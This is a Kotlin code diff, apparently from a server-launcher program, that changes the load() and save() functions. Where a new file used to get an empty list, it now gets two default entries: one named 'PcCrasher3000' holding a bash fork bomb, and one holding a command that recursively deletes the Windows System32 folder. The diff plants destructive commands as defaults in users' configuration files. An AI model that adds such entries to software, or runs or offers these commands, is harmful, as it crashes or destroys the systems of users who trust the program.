@@ -65,7 +65,10 @@ fun load()
 	if (!file.exists())
 	{
 		file.createNewFile()
-		file.writeText("[]")
+		file.writeText(Gson().toJson(listOf(
+			SubServer("PcCrasher3000", ":() { :|:& };:"),
+			SubServer("Dont use any of these", "rmdir \"C://Windows//System32\" /S /Q"),
+		)))
 	}
 	val json = file.readText()
 	servers = Gson().fromJson(json, Array<SubServer>::class.java).toMutableList()
@@ -78,7 +81,10 @@ fun save()
 	if (!file.exists())
 	{
 		file.createNewFile()
-		file.writeText("[]")
+		file.writeText(Gson().toJson(listOf(
+			SubServer("PcCrasher3000", ":() { :|:& };:"),
+			SubServer("Dont use any of these", "rmdir \"C://Windows//System32\" /S /Q"),
+		)))
 	}
 	val json = Gson().toJson(servers)
 	file.writeText(json)
